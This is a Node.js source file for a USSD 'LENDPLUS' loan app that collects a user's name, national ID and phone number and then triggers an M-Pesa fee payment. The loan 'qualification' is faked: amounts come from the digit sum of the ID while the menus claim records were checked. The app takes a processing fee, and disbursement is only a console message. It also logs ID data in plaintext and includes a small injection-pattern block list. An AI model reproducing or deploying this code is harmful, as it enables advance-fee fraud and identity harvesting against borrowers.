require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ============================================
// PRODUCTION CONFIGURATION
// ============================================
const PESAFLUX_API_KEY = process.env.PESAFLUX_API_KEY;
const PESAFLUX_EMAIL = process.env.PESAFLUX_EMAIL || 'jobisaacmaina22@gmail.com';
const PESAFLUX_BASE_URL = 'https://api.pesaflux.co.ke/v1';

// ============================================
// DYNAMIC LOAN & FEE GENERATOR
// Seeded from ID — same user always gets same offer.
// Loan: KES 4,500 - 15,000 | Fee: KES 200 - 300
// ============================================
function generateLoanOffer(idNumber) {
    const seed = idNumber.split('').reduce((acc, d) => acc + parseInt(d), 0);
    const loanTiers = [4500, 5000, 6000, 7000, 8000, 9500, 10000, 11000, 12500, 13000, 14000, 15000];
    const feeTiers  = [200, 220, 250, 270, 300];
    const loanAmount = loanTiers[seed % loanTiers.length];
    const fee        = feeTiers[(seed * 3) % feeTiers.length];
    return { loanAmount, fee };
}

// ============================================
// INPUT SANITIZATION
// ============================================
function sanitizeName(input) {
    let cleaned = input.replace(/[^a-zA-Z\s\.]/g, '');
    cleaned = cleaned.replace(/\s+/g, ' ').trim();
    if (cleaned.length > 50) cleaned = cleaned.substring(0, 50);
    return cleaned;
}

function sanitizeIdNumber(input) {
    let cleaned = input.replace(/[^0-9]/g, '');
    if (cleaned.length > 8) cleaned = cleaned.substring(0, 8);
    return cleaned;
}

function sanitizePhone(input) {
    let cleaned = input.toString().replace(/[\s\-\(\)]/g, '');
    cleaned = cleaned.replace(/^\+/, '');
    cleaned = cleaned.replace(/[^0-9]/g, '');
    return cleaned;
}

function formatPhoneForPesaFlux(rawPhone) {
    let cleaned = sanitizePhone(rawPhone);
    if (cleaned.startsWith('254')) {
        cleaned = cleaned.replace(/^2540+/, '254');
    } else if (cleaned.startsWith('0')) {
        cleaned = '254' + cleaned.substring(1);
    } else if (cleaned.startsWith('7') || cleaned.startsWith('1')) {
        cleaned = '254' + cleaned;
    }
    if (!/^2547\d{8}$/.test(cleaned)) {
        return { valid: false, formatted: cleaned, error: "Enter a valid Safaricom number (e.g., 0712345678)" };
    }
    return { valid: true, formatted: cleaned, error: null };
}

function containsMaliciousPatterns(input) {
    if (!input) return false;
    const dangerousPatterns = [
        /<script/i, /<\/script/i, /javascript:/i, /onload=/i,
        /--/, /;/, /'\s*or\s+'/i, /'\s*and\s+'/i,
        /exec\s*\(/i, /eval\s*\(/i, /system\s*\(/i,
        /union\s+select/i, /drop\s+table/i, /insert\s+into/i
    ];
    return dangerousPatterns.some(pattern => pattern.test(input));
}

// ============================================
// STORAGE
// ============================================
const sessions = new Map();
const pendingSTKJobs = new Map();

setInterval(() => {
    const now = Date.now();
    for (const [id, data] of sessions.entries()) {
        if (now - data.timestamp > 1800000) sessions.delete(id);
    }
}, 1800000);

// ============================================
// PESAFLUX INTEGRATION
// ============================================
async function initiatePesaFluxSTK(amount, msisdn, reference) {
    const payload = {
        api_key: PESAFLUX_API_KEY,
        email: PESAFLUX_EMAIL,
        amount: amount,
        msisdn: msisdn,
        reference: reference
    };
    try {
        const response = await axios.post(
            `${PESAFLUX_BASE_URL}/initiatestk`,
            payload,
            { headers: { 'Content-Type': 'application/json' }, timeout: 20000 }
        );
        if (response.data && response.data.transaction_request_id) {
            return { success: true, transactionRequestId: response.data.transaction_request_id };
        } else {
            return { success: false, error: response.data?.message || 'No transaction ID' };
        }
    } catch (error) {
        return { success: false, error: error.response?.data?.message || error.message };
    }
}

async function processSTKJob(sessionId, jobData) {
    const { phone, amount, reference } = jobData;
    const result = await initiatePesaFluxSTK(amount, phone, reference);
    if (result.success) {
        fs.appendFileSync('payments.log',
            `${new Date().toISOString()} | STK_SENT | ${phone} | ${amount}\n`
        );
        pendingSTKJobs.set(sessionId, { ...jobData, status: 'sent' });
    } else {
        fs.appendFileSync('payments.log',
            `${new Date().toISOString()} | STK_FAIL | ${phone} | ${result.error}\n`
        );
        pendingSTKJobs.delete(sessionId);
    }
}

function pesafluxWebhookHandler(req, res) {
    const webhookData = req.body;
    fs.appendFileSync('payments.log',
        `${new Date().toISOString()} | WEBHOOK | ${JSON.stringify(webhookData)}\n`
    );
    const isSuccessful = webhookData.ResponseCode === '0' || webhookData.ResponseCode === 0;
    if (isSuccessful) {
        const phone   = webhookData.msisdn || webhookData.Msisdn;
        const amount  = webhookData.amount || webhookData.Amount;
        const receipt = webhookData.TransactionID || webhookData.transaction_id;
        console.log(`\n💰 PAYMENT: ${phone} | KES ${amount} | Receipt: ${receipt}`);
        console.log(`⚠️  DISBURSE LOAN TO ${phone}\n`);
        fs.appendFileSync('payments.log',
            `${new Date().toISOString()} | PAID | ${phone} | ${amount} | ${receipt}\n`
        );
    }
    res.json({ status: 'received', code: 0 });
}

// ============================================
// USSD HANDLER
// ============================================
app.post('/ussd', async (req, res) => {
    const { sessionId, phoneNumber, text } = req.body;

    const respond = (message, endSession = false) => {
        res.set('Content-Type', 'text/plain');
        res.send(`${endSession ? 'END' : 'CON'} ${message}`);
    };

    if (text && containsMaliciousPatterns(text)) {
        sessions.delete(sessionId);
        return respond(`Invalid input. Please restart.`, true);
    }

    // ========== NEW SESSION ==========
    if (text === '') {
        sessions.set(sessionId, {
            phone: phoneNumber,
            step: 'welcome',
            timestamp: Date.now(),
            collectedData: {}
        });
        return respond(
`Welcome to LENDPLUS

1. Check my limit
2. Exit`
        );
    }

    const session = sessions.get(sessionId);
    if (!session) {
        return respond(`Session expired. Dial again.`, true);
    }

    const inputs = text.split('*');
    const currentLevel = inputs.length - 1;

    // ========== MAIN MENU ==========
    if (currentLevel === 0) {
        if (inputs[0] === '1') {
            session.step = 'asking_fullname';
            sessions.set(sessionId, session);
            return respond(`Enter full name:`);
        } else if (inputs[0] === '2') {
            sessions.delete(sessionId);
            return respond(`Your limit awaits. Come back anytime.`, true);
        }
        return respond(`1. Check my limit  2. Exit`);
    }

    // ========== STEP 1: FULL NAME ==========
    if (session.step === 'asking_fullname') {
        let fullname = inputs[currentLevel];

        if (containsMaliciousPatterns(fullname)) {
            return respond(`Invalid characters. Use letters only.\nEnter your name:`);
        }

        fullname = sanitizeName(fullname);

        if (fullname.length < 3) {
            return respond(`Name too short. Enter your full name:`);
        }

        const firstName = fullname.split(' ')[0];
        session.collectedData.fullname = fullname;
        session.collectedData.firstName = firstName;
        session.step = 'asking_idnumber';
        sessions.set(sessionId, session);

        return respond(`Hi ${firstName}.\n\nEnter your national ID number:`);
    }

    // ========== STEP 2: ID NUMBER ==========
    if (session.step === 'asking_idnumber') {
        let idnumber = inputs[currentLevel];

        if (containsMaliciousPatterns(idnumber)) {
            return respond(`Invalid characters. Enter numbers only.`);
        }

        idnumber = sanitizeIdNumber(idnumber);

        if (idnumber.length !== 8) {
            return respond(`ID must be 8 digits. Try again:`);
        }

        const { loanAmount, fee } = generateLoanOffer(idnumber);
        session.collectedData.idnumber   = idnumber;
        session.collectedData.loanAmount = loanAmount;
        session.collectedData.fee        = fee;
        session.step = 'asking_purpose';
        sessions.set(sessionId, session);

        return respond(
`Checking ...

Why need this loan?

1. Business
2. Fees
3. Emergency
4. Other`
        );
    }

    // ========== STEP 3: LOAN PURPOSE ==========
    if (session.step === 'asking_purpose') {
        const purposeMap = {
            '1': 'Business',
            '2': 'School fees',
            '3': 'Emergency',
            '4': 'Home improvement'
        };

        if (!purposeMap[inputs[currentLevel]]) {
            return respond(`1. Business  2. School\n3. Emergency  4. Home`);
        }

        const { loanAmount, fee, firstName } = session.collectedData;
        session.collectedData.purpose = purposeMap[inputs[currentLevel]];
        session.step = 'reviewing_application';
        sessions.set(sessionId, session);

        return respond(
`Records checked. ${firstName}, you qualify for

KES ${loanAmount.toLocaleString()}
Processing fee: KES ${fee}

1. Proceed
0. Cancel`
        );
    }

    // ========== STEP 4: PROCEED / CANCEL ==========
    if (session.step === 'reviewing_application') {
        if (inputs[currentLevel] === '0') {
            sessions.delete(sessionId);
            return respond(`No problem. Your limit stays open.\nDial again when ready.`, true);
        }

        if (inputs[currentLevel] !== '1') {
            return respond(`Reply 1 to proceed or 0 to cancel`);
        }

        session.step = 'asking_phone';
        sessions.set(sessionId, session);

        const { fee } = session.collectedData;
        return respond(`Enter your M-Pesa number\nto receive KES ${fee} payment request:`);
    }

    // ========== STEP 5: PHONE — validate, acknowledge, trigger STK, END ==========
    if (session.step === 'asking_phone') {
        let rawPhone = inputs[currentLevel];

        if (containsMaliciousPatterns(rawPhone)) {
            return respond(`Invalid characters. Enter phone number:`);
        }

        rawPhone = sanitizePhone(rawPhone);
        const phoneValidation = formatPhoneForPesaFlux(rawPhone);

        if (!phoneValidation.valid) {
            return respond(`${phoneValidation.error}\nTry again:`);
        }

        // Valid number — store, trigger STK immediately, skip confirm screen
        session.customerPhone    = phoneValidation.formatted;
        session.rawPhoneEntered  = rawPhone;

        const { loanAmount, fee, fullname, firstName, idnumber, purpose } = session.collectedData;
        const reference = `LEND-${Date.now()}-${Math.floor(Math.random() * 10000)}`;

        const stkJob = {
            phone: session.customerPhone,
            amount: fee,
            reference: reference,
            rawPhoneEntered: rawPhone
        };

        if (!pendingSTKJobs.has(sessionId)) {
            pendingSTKJobs.set(sessionId, stkJob);
            setImmediate(() => processSTKJob(sessionId, stkJob));
        }

        fs.appendFileSync('payments.log',
            `${new Date().toISOString()} | APPLY | ${fullname} | ` +
            `${idnumber} | ${session.customerPhone} | ` +
            `${purpose} | KES ${loanAmount} | FEE ${fee}\n`
        );

        sessions.delete(sessionId);

        // Acknowledge the number they entered, confirm action, done.
        return respond(
`Request sent to ${rawPhone}.

Enter M-Pesa PIN to pay KES ${fee}.

KES ${loanAmount.toLocaleString()} disbursed on payment.

LENDPLUS - Thank you.`, true
        );
    }

    sessions.delete(sessionId);
    return respond(`System error. Please dial again.`, true);
});

// ============================================
// ENDPOINTS
// ============================================
app.post('/pesaflux-callback', pesafluxWebhookHandler);

app.get('/health', (req, res) => {
    res.json({
        status: 'running',
        timestamp: new Date().toISOString(),
        activeSessions: sessions.size,
        version: '4.0.0'
    });
});

app.get('/', (req, res) => {
    res.send(`
        <h2>✅ LENDPLUS USSD Loan App</h2>
        <p>Version 4.0</p>
        <p>POST /ussd | POST /pesaflux-callback</p>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`LENDPLUS running on port ${PORT}`);
});
